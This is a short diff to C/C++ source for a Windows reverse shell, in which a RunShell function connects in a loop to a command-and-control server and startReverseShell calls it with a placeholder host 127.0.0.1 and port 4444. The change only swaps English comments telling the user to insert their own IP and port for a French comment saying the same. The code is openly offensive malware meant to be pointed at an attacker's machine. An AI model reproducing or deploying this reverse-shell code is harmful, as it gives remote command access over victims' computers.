@@ -4,7 +4,7 @@
 
 void RunShell(char* C2Server, int C2Port) {
     while(true) {
-        Sleep(1000);    // Five Second
+        Sleep(1000);
 
         SOCKET mySocket;
         sockaddr_in addr;
@@ -59,7 +59,10 @@ void RunShell(char* C2Server, int C2Port) {
 }
 
 void startReverseShell(void) {
-    char host[] = "127.0.0.1";  // change this to your ip address
-    int port = 4444;                //chnage this to your open port
+    /*
+        Il faudra changer l'adresse IP en cas d'utilisation
+    */
+    char host[] = "127.0.0.1";
+    int port = 4444;
     RunShell(host, port);
 }
